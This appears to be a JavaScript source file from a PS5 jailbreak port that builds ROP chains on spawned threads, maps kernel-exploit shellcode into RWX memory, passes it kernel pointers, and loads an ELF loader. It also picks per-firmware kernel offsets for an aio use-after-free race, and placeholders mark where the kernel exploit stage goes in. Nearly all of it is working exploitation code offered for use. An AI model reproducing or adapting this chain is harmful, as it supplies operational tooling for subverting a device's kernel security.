        // ------------------------------------------------------------------
        // Allocation for anything the *kernel or native code* will dereference.
        //
        // Y2JB's malloc() returns the raw V8 backing-store field. On newer
        // YouTube apps (01.000.030+, i.e. fw 12.20+) that field comes back
        // V8-sandbox *tagged* for larger allocations - observed on hardware as
        // `elfldr @ 0xd00000027fa00020` for a 0x60ec8 buffer, while small ones
        // (< ~64 KB) are plain addresses. The framework's own read*/write*
        // primitives accept the tagged form, so JavaScript-side copies still
        // work, but a syscall or the kexp shellcode dereferencing it faults on
        // a non-canonical address and takes the console down.
        //
        // So: check every pointer we hand out, and fall back to an anonymous
        // mmap (a real kernel VA by construction) when malloc gives us a tag.
        // ------------------------------------------------------------------
        let tagged_malloc_seen = false;

        // mmap constants, resolved defensively: Y2JB's global.js defines them,
        // but p2jb already had to probe for PROT_EXEC across versions.
        const M_PROT_R = (typeof PROT_READ !== "undefined") ? BigInt(PROT_READ) : 0x1n;
        const M_PROT_W = (typeof PROT_WRITE !== "undefined") ? BigInt(PROT_WRITE) : 0x2n;
        const M_PROT_X = (typeof PROT_EXEC !== "undefined") ? BigInt(PROT_EXEC) : 0x4n;
        const M_PROT_RW = M_PROT_R | M_PROT_W;
        const M_PROT_RWX = M_PROT_RW | M_PROT_X;
        const M_MAP_SHARED = (typeof MAP_SHARED !== "undefined") ? BigInt(MAP_SHARED) : 0x1n;
        const M_MAP_PRIVATE = (typeof MAP_PRIVATE !== "undefined") ? BigInt(MAP_PRIVATE) : 0x2n;
        const M_MAP_ANON = (typeof MAP_ANONYMOUS !== "undefined") ? BigInt(MAP_ANONYMOUS) : 0x1000n;
        const M_MAP_PRIV_ANON = M_MAP_PRIVATE | M_MAP_ANON;

        function is_canonical_user(v) {
            const x = BigInt(v) & MASK64;
            return x !== 0n && x < 0x0000800000000000n;
        }

        function hmalloc(size) {
            const n = BigInt(size);
            const addr = malloc(n);
            if (is_canonical_user(addr)) return addr;

            const pages = (n + 0x3fffn) & ~0x3fffn;
            const va = syscall(SYSCALL.mmap, 0n, pages, M_PROT_RW,
                M_MAP_PRIV_ANON, MASK64, 0n);
            if (!is_canonical_user(va))
                fatal("hmalloc: malloc returned a tagged pointer (0x" +
                    addr.toString(16) + ") and the mmap fallback for 0x" +
                    n.toString(16) + " bytes failed (0x" + va.toString(16) + ")");
            if (!tagged_malloc_seen) {
                tagged_malloc_seen = true;
                say("malloc() returns V8-tagged backing stores for large " +
                    "allocations on this app version - using mmap for every " +
                    "buffer native code touches (0x" + addr.toString(16) +
                    " -> 0x" + va.toString(16) + ")");
            }
            return va;
        }

        function native_ptr(what, addr) {
            if (!is_canonical_user(addr))
                fatal(what + " = 0x" + (BigInt(addr) & MASK64).toString(16) +
                    " is not a canonical user address - refusing to hand it " +
                    "to native code (would fault the console)");
            return BigInt(addr);
        }

        // allproc is a kernel address on purpose: the shellcode walks it.
        function kernel_ptr(what, addr) {
            const x = BigInt(addr) & MASK64;
            if ((x >> 48n) !== 0xffffn)
                fatal(what + " = 0x" + x.toString(16) + " is not a kernel address");
            return x;
        }

        // ------------------------------------------------------------------
        // `p` - the userland read/write primitive.
        // Relapse builds this out of its WebKit stage; on Y2JB the framework
        // already has it (addrof/fakeobj + read*/write* over the whole
        // process address space).
        // ------------------------------------------------------------------
        const p = {
            malloc(size, type) { return fromBig(hmalloc(BigInt(size))); },
            read1(addr) { return Number(read8(big(addr)) & 0xffn); },
            read2(addr) { return Number(read16(big(addr)) & 0xffffn); },
            read4(addr) { return Number(read32(big(addr)) & MASK32); },
            read8(addr) { return fromBig(read64(big(addr))); },
            write1(addr, value) { write8(big(addr), words(value)[0] & 0xffn); },
            write2(addr, value) { write16(big(addr), words(value)[0] & 0xffffn); },
            write4(addr, value) { write32(big(addr), words(value)[0] & MASK32); },
            write8(addr, value) {
                const [lo, hi] = words(value);
                write64(big(addr), ((hi & MASK32) << 32n) | (lo & MASK32));
            },
            stringify(str) { return fromBig(alloc_string(str)); },
            writestr(addr, str) {
                for (let i = 0; i < str.length; i++) {
                    const byte = str.charCodeAt(i);
                    if (byte === 0) break;
                    write8(big(addr) + BigInt(i), BigInt(byte & 0xff));
                }
                write8(big(addr) + BigInt(str.length), 0n);
            },
        };

        // ------------------------------------------------------------------
        // Worker ROP chain.
        //
        // Two execution paths:
        //   * single syscalls / calls -> the framework's main-thread ROP
        //     (syscall()/call()); fast, and this is where Relapse spends
        //     ~99% of its syscalls.
        //   * chain.run() -> one pre-built chain executed on its own
        //     thr_new'd thread. Only the timing-critical reclaim batch uses
        //     this (32 ioctls, aio_multi_wait, 256 ioctls, 64x13 submits
        //     must not have a JS round-trip in the middle).
        //
        // The thread trampoline is `thr_new` + `pop rsp; ret`. Y2JB's own
        // lapse.js and the p2jb port use a libc setjmp/longjmp trampoline
        // instead, which hardcodes libc offsets that only match the YouTube
        // app 01.000.003; `pop rsp` comes from the framework's ROP table, so
        // it is correct for every app version Y2JB supports.
        // ------------------------------------------------------------------
        function spawn_worker(chain_addr) {
            // thr_new gives the new thread rip = start_func, rdi = arg and
            // rsp somewhere inside [stack_base, stack_base + stack_size]. The
            // whole region is filled with chain_addr, so wherever rsp lands,
            // `pop rsp` loads chain_addr and the `ret` that follows enters the
            // chain at slot 0. Extra bytes above stack_size cover a kernel
            // that puts rsp exactly at the top.
            const thr_new_args = hmalloc(0x80);
            for (let i = 0n; i < 0x80n; i += 8n) write64(thr_new_args + i, 0n);
            const tid_addr = hmalloc(0x8);
            const cpid = hmalloc(0x8);
            const stack = hmalloc(WORKER_STACK_SIZE);
            const tls = hmalloc(0x40);
            for (let i = 0n; i < WORKER_STACK_SIZE; i += 8n)
                write64(stack + i, chain_addr);
            for (let i = 0n; i < 0x40n; i += 8n) write64(tls + i, 0n);

            write64(thr_new_args + 0x00n, ROP.pop_rsp);    // start_func
            write64(thr_new_args + 0x08n, 0n);             // arg (unused)
            write64(thr_new_args + 0x10n, stack);          // stack_base
            write64(thr_new_args + 0x18n, WORKER_STACK_PASS);
            write64(thr_new_args + 0x20n, tls);            // tls_base
            write64(thr_new_args + 0x28n, 0x40n);          // tls_size
            write64(thr_new_args + 0x30n, tid_addr);       // child_tid
            write64(thr_new_args + 0x38n, cpid);           // parent_tid

            const rv = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
            if (rv !== 0n) throw new Error("thr_new failed: " + toHex(rv));
            return read64(tid_addr);
        }

        class Y2Chain {
            constructor(host) {
                this.p = host;
                this.entries = [];
                this.return_value = host.malloc(8);
                this.finished = hmalloc(8);
                write64(this.finished, 0n);
                this.workerAffinity = null;   // { core, rtprio }
                this.chainsRun = 0;
            }

            // Pin the chain worker to a single core (Relapse runs the whole
            // race on one core). Emitted at the head of every run().
            setWorkerAffinity(core, rtprio) {
                this.workerAffinity = { core, rtprio };
            }

            clear() { this.entries = []; }

            push(value) { this.entries.push(big(value)); }

            push_write8(dest, value) {
                this.push(ROP.pop_rdi); this.push(dest);
                this.push(ROP.pop_rsi); this.push(value);
                this.push(ROP.mov_qword_rdi_rsi);
            }

            write_result(dest) {
                this.push(ROP.pop_rdi); this.push(dest);
                this.push(ROP.mov_qword_rdi_rax);
            }

            push_sysv(rdi, rsi, rdx, rcx, r8, r9) {
                const args = [rdi, rsi, rdx, rcx, r8, r9];
                const regs = [ROP.pop_rdi, ROP.pop_rsi, ROP.pop_rdx,
                    ROP.pop_rcx, ROP.pop_r8, ROP.pop_r9];
                for (let i = 0; i < args.length; i++) {
                    if (args[i] === undefined) continue;
                    this.push(regs[i]);
                    this.push(args[i]);
                }
            }

            // rop.js keeps the call target in a 16-byte aligned slot so that
            // RSP % 16 == 8 when the callee starts. The 2-slot runway is even,
            // so body parity == absolute slot parity.
            alignForCall() {
                if (this.entries.length % 2 !== 0) this.push(ROP.ret);
            }

            fcall(rip, rdi, rsi, rdx, rcx, r8, r9) {
                this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
                this.alignForCall();
                this.push(rip);
            }

            add_syscall(num, rdi, rsi, rdx, rcx, r8, r9) {
                this.push(ROP.pop_rax); this.push(num);
                this.fcall(syscall_wrapper, rdi, rsi, rdx, rcx, r8, r9);
            }

            add_syscall_ret(store, num, rdi, rsi, rdx, rcx, r8, r9) {
                this.add_syscall(num, rdi, rsi, rdx, rcx, r8, r9);
                this.write_result(store);
            }

            add_call(rip, rdi, rsi, rdx, rcx, r8, r9) {
                this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
            }

            // ---- main-thread fast paths ------------------------------------
            async syscall(num, ...args) {
                const a = [0n, 0n, 0n, 0n, 0n, 0n];
                for (let i = 0; i < 6 && i < args.length; i++)
                    if (args[i] !== undefined) a[i] = big(args[i]);
                return fromBig(syscall(big(num), a[0], a[1], a[2], a[3], a[4], a[5]));
            }

            async call(rip, ...args) {
                const a = [0n, 0n, 0n, 0n, 0n, 0n];
                for (let i = 0; i < 6 && i < args.length; i++)
                    if (args[i] !== undefined) a[i] = big(args[i]);
                return fromBig(call(big(rip), a[0], a[1], a[2], a[3], a[4], a[5]));
            }

            // ---- raw chain on a worker thread ------------------------------
            async run() {
                const entries = this.entries.slice();
                if (entries.length === 0) return;

                const RUNWAY = 2;              // slots 0-1 are consumed before the body
                const PIN_MAX = 32;            // optional affinity/rtprio head
                const EPILOGUE = 16;           // flag write + thr_exit
                const qwords = RUNWAY + entries.length + PIN_MAX + EPILOGUE;
                const bytes = BigInt(qwords * 8) + 0x4000n;
                const buf = hmalloc(bytes);
                for (let i = 0n; i < bytes; i += 8n) write64(buf + i, 0n);

                const entry = (buf + 0x100n + 15n) & ~15n;
                let idx = 0;
                const emit = (v) => { write64(entry + BigInt(idx++ * 8), big(v)); };
                const alignEmit = () => { if (idx % 2 !== 0) emit(ROP.ret); };

                // `pop rsp; ret` enters the chain with RSP = slot 0, so its
                // own `ret` executes slot 0 as a gadget; the second `ret`
                // consumes slot 1. The body therefore starts at slot 2, which
                // is even - the parity alignForCall() assumes.
                emit(ROP.ret);
                emit(ROP.ret);

                if (this.workerAffinity) {
                    const { core, rtprio } = this.workerAffinity;
                    const mask = hmalloc(0x10);
                    write64(mask, 1n << BigInt(core));
                    write64(mask + 8n, 0n);
                    const rt = hmalloc(0x10);
                    write64(rt, 0n);
                    write64(rt + 8n, 0n);
                    if (rtprio !== undefined && rtprio !== null)
                        write8(rt, BigInt(rtprio & 0xffff));

                    emit(ROP.pop_rax); emit(SYSCALL.cpuset_setaffinity);
                    emit(ROP.pop_rdi); emit(3n);            // CPU_LEVEL_WHICH
                    emit(ROP.pop_rsi); emit(1n);            // CPU_WHICH_TID
                    emit(ROP.pop_rdx); emit(MASK64);        // td = -1 (self)
                    emit(ROP.pop_rcx); emit(0x10n);
                    emit(ROP.pop_r8); emit(mask);
                    alignEmit(); emit(syscall_wrapper);

                    if (rtprio !== undefined && rtprio !== null) {
                        emit(ROP.pop_rax); emit(SYSCALL.rtprio_thread);
                        emit(ROP.pop_rdi); emit(1n);        // RTP_SET
                        emit(ROP.pop_rsi); emit(0n);
                        emit(ROP.pop_rdx); emit(rt);
                        alignEmit(); emit(syscall_wrapper);
                    }
                }

                // The chain builder aligns call targets on the parity of its
                // own index, which only matches the absolute slot parity when
                // the body starts on an even slot. Pad the head if needed.
                if (idx % 2 !== 0) emit(ROP.ret);

                for (const e of entries) emit(e);

                // completion flag, then get off the thread
                emit(ROP.pop_rax); emit(1n);
                emit(ROP.pop_rdi); emit(this.finished);
                emit(ROP.mov_qword_rdi_rax);
                emit(ROP.pop_rax); emit(SYSCALL.thr_exit);
                emit(ROP.pop_rdi); emit(0n);
                alignEmit(); emit(syscall_wrapper);
                emit(ROP.ret);

                if (idx > qwords)
                    throw new Error("chain overflow: " + idx + " > " + qwords);

                write64(this.finished, 0n);
                const tid = spawn_worker(entry);
                this.chainsRun++;

                const deadline = Date.now() + CHAIN_TIMEOUT_MS;
                while (read64(this.finished) === 0n) {
                    if (Date.now() > deadline)
                        throw new Error("the chain worker (tid " + tid +
                            ", " + entries.length + " entries) never finished " +
                            "in " + (CHAIN_TIMEOUT_MS / 1000) + "s - reboot");
                    await sleep(1);
                }
                this.clear();
            }
        }

        // One-syscall chain, compared against a host-side getpid().
        async function probe_worker_chain(chain) {
            const pid_buf = hmalloc(8);
            write64(pid_buf, 0n);

            chain.clear();
            chain.add_syscall_ret(pid_buf, SYSCALL.getpid);
            await chain.run();

            const via_chain = read64(pid_buf);
            const via_host = syscall(SYSCALL.getpid);
            if (via_chain === 0n || via_chain !== via_host)
                fatal("worker chain self-test failed (chain getpid " +
                    toHex(via_chain) + ", host getpid " + toHex(via_host) +
                    ") - thr_new/ROP.pop_rsp do not behave as expected on " +
                    "this YouTube app version");
            say("worker chain self-test OK (pid " + via_chain.toString(10) + ")");
        }


        // ------------------------------------------------------------------
        // kexp / elfldr delivery.
        //
        // This replaces Y2JB's load_aioshellcode(), which is functionally the
        // same but allocates the elfldr image with the framework's malloc() -
        // and on app 01.000.030 that returns the V8-tagged 0xd00000027fa00020
        // seen on hardware, which the shellcode then dereferences. Every
        // buffer the shellcode touches is mmap'd here instead, and every
        // pointer handed over is canonicality-checked first.
        //
        // Argument block layout is the one ufm42's kexp expects (identical to
        // Y2JB's aioshellcode.js and to Relapse's own kexp.js):
        //   0x00 u32 master read fd     0x10 u64 allproc
        //   0x04 u32 master write fd    0x18 u64 elfldr image
        //   0x08 u32 victim read fd     0x20 u64 elfldr size
        //   0x0c u32 victim write fd
        // ------------------------------------------------------------------
        const KEXP_BIN_NAMES = ["kexp_2026_05_25.bin", "kexp.bin"];
        const ELFLDR_NAMES = ["elfldr-ps5-1360.elf", "elfldr-ps5-0.23.elf",
            "elfldr_1320_v5.elf", "elfldr.elf"];
        const CACHE_SUBDIR = "download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY=";

        function payload_dirs() {
            const dirs = [];
            let title = null;
            try {
                if (typeof TITLE_ID === "string" && TITLE_ID.length) title = TITLE_ID;
                else if (typeof get_title_id === "function") title = get_title_id();
            } catch (_) { }
            if (title)
                for (const slot of ["000", "001", "002"])
                    dirs.push("/mnt/sandbox/" + title + "_" + slot + "/" + CACHE_SUBDIR);
            for (let u = 0; u < 8; u++) dirs.push("/mnt/usb" + u);
            return dirs;
        }

        // Last resort: list the directories and match by pattern. Y2JB renames
        // the elfldr per release (1.6 ships elfldr-ps5-1340.elf, 1.7 ships
        // elfldr-ps5-1360.elf), and a USB stick may hold anything.
        function list_dir(path, max) {
            const path_addr = alloc_string(path);
            const fd = syscall(SYSCALL.open, path_addr, 0n /* O_RDONLY */);
            if (fd === MASK64) return null;
            const buf = hmalloc(0x4000);
            const out = [];
            try {
                for (let round = 0; round < 8 && out.length < max; round++) {
                    const len = Number(syscall(SYSCALL.getdents, fd, buf, 0x4000n));
                    if (len <= 0) break;
                    let off = 0;
                    while (off < len && out.length < max) {
                        const reclen = Number(read16(buf + BigInt(off) + 16n));
                        if (reclen < 24 || off + reclen > len) break;
                        const namlen = Number(read8(buf + BigInt(off) + 19n));
                        let name = "";
                        for (let i = 0; i < namlen && i < 255; i++)
                            name += String.fromCharCode(
                                Number(read8(buf + BigInt(off) + 20n + BigInt(i))));
                        out.push(name);
                        off += reclen;
                    }
                }
            } catch (_) {
            } finally {
                try { syscall(SYSCALL.close, fd); } catch (_) { }
            }
            return out;
        }

        function scan_for(pattern, tried) {
            for (const dir of payload_dirs()) {
                let names = null;
                try { names = list_dir(dir, 128); } catch (e) { names = null; }
                if (!names) continue;
                const hit = names.filter((n) => pattern.test(n));
                if (hit.length) {
                    tried.push("getdents(" + dir + ") matched " + hit.join(", "));
                    return dir + "/" + hit[0];
                }
            }
            tried.push("getdents pattern scan for " + pattern);
            return null;
        }

        // Returns { path, data } or null; `tried` collects everything we probed
        // so a failure can say exactly where it looked.
        function find_payload(names, pattern, tried) {
            // the framework's own helper knows the exact slot and file name
            if (typeof find_file === "function")
                for (const name of names) {
                    let path = null;
                    try { path = find_file(name); } catch (e) { tried.push("find_file(" + name + ") threw " + e.message); }
                    if (path) { tried.push("find_file(" + name + ") -> " + path); return { path, via: "find_file" }; }
                }
            else tried.push("find_file() not in scope");

            for (const dir of payload_dirs())
                for (const name of names) {
                    const path = dir + "/" + name;
                    let ok = false;
                    try { ok = file_exists(path); } catch (e) { tried.push("file_exists(" + path + ") threw " + e.message); }
                    if (ok) return { path, via: "search" };
                }
            tried.push("file_exists over " + payload_dirs().length + " dirs x " + names.length + " names");

            const scanned = scan_for(pattern, tried);
            if (scanned) return { path: scanned, via: "getdents" };
            return null;
        }

        // Anonymous RW memory: a real kernel VA, unlike a malloc'd backing
        // store on some V8 builds. Everything the shellcode dereferences is
        // allocated here.
        function mmap_rw(size) {
            const pages = (BigInt(size) + 0x3fffn) & ~0x3fffn;
            const va = syscall(SYSCALL.mmap, 0n, pages, M_PROT_RW,
                M_MAP_PRIV_ANON, MASK64, 0n);
            if (!is_canonical_user(va))
                fatal("mmap(0x" + pages.toString(16) + ", RW) failed: 0x" +
                    (BigInt(va) & MASK64).toString(16));
            return va;
        }

        // The elfldr can also come from the framework's own loader, which is
        // what Y2JB itself uses; we only take the *bytes* out of it (its
        // malloc'd image pointer is the tagged one that faulted the console).
        async function elfldr_bytes(tried) {
            try {
                if (typeof load_elfldr === "function") {
                    await load_elfldr();
                    if (typeof elfldr_data !== "undefined" && elfldr_data && elfldr_data.length > 0x1000) {
                        tried.push("framework load_elfldr() -> " + elfldr_data.length + " bytes");
                        return { data: elfldr_data, via: "load_elfldr" };
                    }
                    tried.push("framework load_elfldr() produced no elfldr_data");
                } else tried.push("load_elfldr() not in scope");
            } catch (e) {
                tried.push("load_elfldr() threw " + e.message);
            }
            return null;
        }

        function payload_fail(what, names, tried) {
            let title = "?";
            try { title = (typeof TITLE_ID === "string" && TITLE_ID) ? TITLE_ID : get_title_id(); } catch (_) { }
            fatal("no " + what + " found (names: " + names.join(", ") + "; TITLE_ID " +
                title + "; find_file=" + (typeof find_file) + ", read_file=" +
                (typeof read_file) + ", file_exists=" + (typeof file_exists) +
                "; cache dir " + CACHE_SUBDIR + "). Probed:\n  " +
                tried.join("\n  ") + "\nIf the sandbox cache is empty, Y2JB's " +
                "payload files were evicted - re-install/re-copy them (see the " +
                "Y2JB setup) or put " + names[0] + " on a USB stick.");
        }

        // Layout Relapse's kexp.js expects of this blob. Both the Y2JB copy and
        // the Relapse copy are 18912 bytes and differ in exactly 15 bytes: the
        // three logCall sites below (Relapse ships them pre-NOPed, Y2JB keeps
        // them live - that is why Y2JB's loader prints "PS5 AIO JB Shellcode by
        // ufm42"). Everything else, including both resolver calls at 0x1c/0x23
        // and the empty import table at 0x48b0..0x4900, is byte-identical.
        const KEXP_SIG = {
            size: 18912,
            resolverCalls: [[0x1c, [0xe8, 0xcf, 0x00, 0x00, 0x00]],
                            [0x23, [0xe8, 0x78, 0x01, 0x00, 0x00]]],
            getpidAt: 0x10f1,
            logCalls: [0x126d, 0x12ad, 0x3bc2],
            imports: {
                libkernel: { sceKernelSendNotificationRequest: 0x48b0,
                    sysctlbyname: 0x48b8, pthread_create: 0x48c0,
                    pthread_join: 0x48c8 },
                libc: { malloc: 0x48d0, free: 0x48d8, memcpy: 0x48e0,
                    memset: 0x48e8, strcmp: 0x48f0, memcmp: 0x48f8,
                    vsnprintf: 0x4900 },
            },
        };

        function report_kexp_signature(data) {
            const at = (o, n) => Array.from(data.subarray(o, o + n));
            const eq = (o, want) => at(o, want.length).every((b, i) => b === want[i]);
            const okSize = data.length === KEXP_SIG.size;
            const okRes = KEXP_SIG.resolverCalls.every(([o, b]) => eq(o, b));
            const qword = (o) => {
                let v = 0n;
                for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(data[o + i]);
                return v;
            };
            let filled = 0;
            for (const group of Object.values(KEXP_SIG.imports))
                for (const off of Object.values(group))
                    if (qword(off) !== 0n) filled++;
            log_now("handoff 3b: blob " + data.length + " bytes (expected " +
                KEXP_SIG.size + ", " + (okSize ? "ok" : "MISMATCH") +
                "), resolver calls " + (okRes ? "intact" : "ALTERED") +
                ", logCalls " + KEXP_SIG.logCalls.map((o) =>
                    data[o] === 0xe8 ? "live" : data[o] === 0x90 ? "nop" : "?").join("/") +
                ", import slots filled " + filled + "/11" +
                " -> the blob resolves its own imports at runtime");
            return okSize && okRes;
        }

        async function handoff_kexp(allproc, master_pipe, victim_pipe) {
            const tried = [];

            const elf_names = ELFLDR_NAMES.slice();
            const bin_names = KEXP_BIN_NAMES.slice();
            try {
                if (typeof ELFLDR_NAME === "string" && ELFLDR_NAME) elf_names.unshift(ELFLDR_NAME);
                if (typeof BIN_NAME === "string" && BIN_NAME) bin_names.unshift(BIN_NAME);
            } catch (_) { }

            let elf = await elfldr_bytes(tried);
            if (!elf) {
                const found = find_payload(elf_names, /^elfldr.*\.elf$/i, tried);
                if (!found) payload_fail("elfldr", elf_names, tried);
                elf = { data: read_file(found.path), via: found.path };
            }

            const kfound = find_payload(bin_names, /^kexp.*\.bin$/i, tried);
            if (!kfound) payload_fail("kexp shellcode", bin_names, tried);
            const kexp_data = read_file(kfound.path);

            const elfldr_data = elf.data;
            await asay("handoff 1/6: elfldr via " + elf.via + " (" +
                elfldr_data.length + " bytes), kexp " + kfound.path + " (" +
                kexp_data.length + " bytes)");
            if (elfldr_data.length < 0x1000)
                fatal("elfldr image is only " + elfldr_data.length + " bytes");

            // elfldr image: real VA, not a malloc'd backing store
            const elfldr_va = native_ptr("elfldr image", mmap_rw(elfldr_data.length));
            write_buffer(elfldr_va, elfldr_data);
            if (Number(read8(elfldr_va) & 0xffn) !== 0x7f)
                fatal("elfldr image did not land at 0x" + elfldr_va.toString(16) +
                    " (magic 0x" + read8(elfldr_va).toString(16) + ")");
            await asay("handoff 2/6: elfldr image @ 0x" + elfldr_va.toString(16) +
                " (magic ok)");

            // kexp shellcode: jitshm object mapped RWX (same as aioshellcode.js)
            const kexp_size = (BigInt(kexp_data.length) + 0x3fffn) & ~0x3fffn;
            const exec_fd = syscall(SYSCALL.jitshm_create, 0n, kexp_size, M_PROT_RWX);
            if (exec_fd === MASK64 || exec_fd < 0n || exec_fd >= 0x100000n)
                fatal("jitshm_create(0x" + kexp_size.toString(16) +
                    ") failed: 0x" + (exec_fd & MASK64).toString(16));
            let entry = syscall(SYSCALL.mmap, 0n, kexp_size, M_PROT_RWX, M_MAP_SHARED,
                exec_fd, 0n);
            if (!is_canonical_user(entry)) {
                const alias_fd = syscall(SYSCALL.jitshm_alias, exec_fd, M_PROT_RW);
                const rw = syscall(SYSCALL.mmap, 0n, kexp_size, M_PROT_RW,
                    M_MAP_SHARED, alias_fd, 0n);
                if (!is_canonical_user(rw)) fatal("could not map the kexp shellcode");
                write_buffer(rw, kexp_data);
                entry = syscall(SYSCALL.mmap, 0n, kexp_size, M_PROT_RWX, M_MAP_SHARED,
                    exec_fd, 0n);
                if (!is_canonical_user(entry)) fatal("could not map the kexp shellcode RWX");
            } else {
                write_buffer(entry, kexp_data);
            }
            entry = native_ptr("kexp entry", entry);
            await asay("handoff 3/6: kexp shellcode mapped @ 0x" +
                entry.toString(16));
            if (REPORT_KEXP_SIGNATURE) {
                try { report_kexp_signature(kexp_data); } catch (e) {
                    log_now("handoff 3b: signature report failed: " + e.message);
                }
            }

            const args = native_ptr("kexp args", mmap_rw(0x40));
            for (let i = 0n; i < 0x40n; i += 8n) write64(args + i, 0n);
            write32(args + 0x00n, BigInt(master_pipe[0]));
            write32(args + 0x04n, BigInt(master_pipe[1]));
            write32(args + 0x08n, BigInt(victim_pipe[0]));
            write32(args + 0x0cn, BigInt(victim_pipe[1]));
            write64(args + 0x10n, kernel_ptr("allproc", allproc));
            write64(args + 0x18n, elfldr_va);
            write64(args + 0x20n, BigInt(elfldr_data.length));

            const thr_handle = native_ptr("thread handle", mmap_rw(8));
            const thr_result = native_ptr("thread result", mmap_rw(8));
            write64(thr_handle, 0n);
            write64(thr_result, 0n);

            await asay("handoff 4/6: args @ 0x" + args.toString(16) +
                " allproc 0x" + BigInt(allproc).toString(16) + " master " +
                master_pipe.join("/") + " victim " + victim_pipe.join("/"));
            await asay("handoff 5/6: Thrd_create(entry=0x" + entry.toString(16) +
                ", args=0x" + args.toString(16) + ")");
            const created = call(Thrd_create, thr_handle, entry, args);
            if (created !== 0n) fatal("Thrd_create failed: " + toHex(created));
            const tid = read64(thr_handle);
            await asay("handoff 6/6: thread " + tid.toString(10) +
                " running, joining...");
            const joined = call(Thrd_join, tid, thr_result);
            if (joined !== 0n) fatal("Thrd_join failed: " + toHex(joined));
            await asay("kexp shellcode returned " + toHex(read64(thr_result)));
            return true;
        }

        // ------------------------------------------------------------------
        // Kernel offsets (window.KRW from Relapse-Exploit/offsets/*.js)
        // ------------------------------------------------------------------
        //__KRW_TABLE__

        function pick_offsets(fw) {
            const known = Object.keys(KRW_TABLE);
            // Y2JB reports e.g. "11.60"; Relapse only ships exact-firmware
            // tables (kernel .data RVAs move every release), so do not guess.
            return {
                off: KRW_TABLE[fw] || null,
                known,
                hint: known.filter((k) => k.split(".")[0] === String(fw).split(".")[0]),
            };
        }

        // ------------------------------------------------------------------
        // Kernel stage - Relapse-Exploit/src/relapse_exploit.js
        // ------------------------------------------------------------------
        //__KERNEL_EXPLOIT__

        // ------------------------------------------------------------------
        // Build A: crash-artifact scan.
        //
        // A panic on this console is an immediate black screen with nothing on
        // it, so before building a kernel trap hook it is worth asking whether
        // the firmware's own crash reporter already wrote something down. This
        // runs on the boot after a panic, before the exploit, and writes
        // nothing: directory listings plus raw stat words for anything that
        // looks like a dump or was modified recently. The stat words are logged
        // raw rather than interpreted, because the PS5 struct stat layout is
        // not the FreeBSD one (the autoloader reads st_size at +0x48) and a
        // guessed field would silently report the wrong file.
        // ------------------------------------------------------------------
        function stat_words(path) {
            const p = alloc_string(path);
            const buf = hmalloc(0x200);
            if (syscall(SYSCALL.stat, p, buf) === MASK64) return null;
            const out = [];
            for (let off = 0n; off < 0x90n; off += 8n) out.push(read64(buf + off));
            return out;
        }

        function scan_crash_artifacts() {
            const dirs = ["/user/temp", "/user/temp/common_temp", "/user/common",
                "/user/crash", "/user/swap", "/user/shell", "/mnt/auto",
                "/var", "/var/db", "/var/log", "/var/crash"];
            const interesting = /crash|dump|core|panic|kdump|report|assert|err|\.log/i;
            const now_s = Math.floor(Date.now() / 1000);
            say("crash-artifact scan (wall clock " + now_s + " = 0x" +
                now_s.toString(16) + "; a bogus clock just means the timestamp " +
                "filter is useless, the listings still are not)");
            for (const dir of dirs) {
                let names = null;
                try { names = list_dir(dir, 256); } catch (_) { names = null; }
                if (!names) { say("  " + dir + ": not readable"); continue; }
                say("  " + dir + ": " + names.length + " entries - " +
                    names.slice(0, 40).join(", ") + (names.length > 40 ? ", ..." : ""));
                for (const name of names) {
                    if (name === "." || name === "..") continue;
                    let st = null;
                    try { st = stat_words(dir + "/" + name); } catch (_) { st = null; }
                    if (!st) continue;
                    // Any word that looks like a Unix timestamp inside the last
                    // day: the reporter would have written it during the panic.
                    let recent = false;
                    for (const w of st) {
                        const v = Number(w & MASK64);
                        if (v > now_s - 86400 && v < now_s + 3600) { recent = true; break; }
                    }
                    if (!recent && !interesting.test(name)) continue;
                    say("    " + dir + "/" + name +
                        (recent ? "  <-- modified within a day" : "") + "\n      " +
                        st.map((w, i) => "+" + (i * 8).toString(16) + "=0x" +
                            (w & MASK64).toString(16)).join(" "));
                }
            }
        }

        // ------------------------------------------------------------------
        // Driver
        // ------------------------------------------------------------------
        capture_log_socket();
        if (net_log_init())
            log_now("network log: every line also goes to " + net_log_target +
                " (tools/log_listener.py)");
        else if (NET_LOG !== "off")
            log_now("network log disabled: " +
                (net_log_error || net_log_reason || "unknown reason") +
                ". Without UDP the only transcript is the loader's TCP stream, " +
                "which reorders and loses lines when the console dies");

        send_notification(relapse_version + "\nFW " + FW_VERSION + "\n" +
            (typeof version_string === "string" ? version_string : "Y2JB"));

        say("relapse-y2jb starting - port by edisnord");

        if (typeof is_jailbroken === "function" && is_jailbroken()) {
            send_notification("relapse: already jailbroken");
            // say(), not log(): log() waits on a rAF before writing, so on an
            // immediate return the line never reaches the payload sender and the
            // run looks like it silently did nothing.
            say("already jailbroken - nothing to do");
            return;
        }

        if (!ALLOW_AFTER_P2JB) {
            const p2jb_markers = ["/user/temp/common_temp/p2jb.fail"];
            try {
                p2jb_markers.unshift("/" + get_nidpath() + "/common_temp/p2jb.fail");
            } catch (_) { }
            const hit = p2jb_markers.filter((m) => {
                try { return file_exists(m); } catch (_) { return false; }
            });
            if (hit.length)
                fatal("p2jb already ran this boot (" + hit[0] + ") but this " +
                    "process is not jailbroken - reboot the PS5 instead of " +
                    "racing the aio UAF on top of p2jb's kernel state " +
                    "(or set ALLOW_AFTER_P2JB = true)");
        }

        if (typeof read_file !== "function")
            fatal("read_file is not in scope - the kexp/elfldr delivery reads " +
                "them from the Y2JB sandbox slot");
        if (typeof Thrd_create === "undefined" || typeof Thrd_join === "undefined")
            fatal("Thrd_create/Thrd_join are not in scope (Y2JB framework too old?)");

        const fw = String(FW_VERSION);
        const picked = pick_offsets(fw);
        const off = picked.off;
        if (!off)
            fatal("FW " + fw + " has no Relapse offset table. Bundled: " +
                (picked.hint.length ? picked.hint.join(", ") +
                    " (this major version)" : picked.known.join(", ")));

        log_now("FW " + fw + " offsets loaded (allproc rva " +
            toHex(BigInt(off.allproc)) + ", aio uaf)");

        // One run per boot: the aio UAF can panic the console, and a panic
        // leaves the marker behind so the next launch refuses to re-run.
        const marker_paths = ["/user/temp/common_temp/" + FAIL_MARKER_NAME];
        try {
            marker_paths.unshift("/" + get_nidpath() + "/common_temp/" + FAIL_MARKER_NAME);
        } catch (_) { }
